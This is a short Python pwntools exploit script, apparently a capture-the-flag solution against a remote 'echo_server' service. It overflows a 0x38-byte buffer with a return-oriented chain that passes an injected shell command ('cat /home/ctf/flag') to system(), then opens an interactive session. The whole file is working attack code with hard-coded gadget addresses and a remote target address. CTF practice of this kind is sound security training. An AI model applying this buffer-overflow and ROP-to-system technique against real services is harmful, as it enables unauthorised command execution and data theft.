from pwn import *

system = 0x400570
cmd = 0x601080
ret = 0x400631
#r = process('echo_server')
r = remote('140.110.112.77', 6129)
raw_input('debug')
r.recvuntil('===============================')
payload = 'cat /home/ctf/flag;echo \'\x00'
r.sendline(payload + 'a' * (0x38 - len(payload)) + p64(ret) + p64(0x400923) + p64(cmd + 6) + p64(system))
r.interactive()
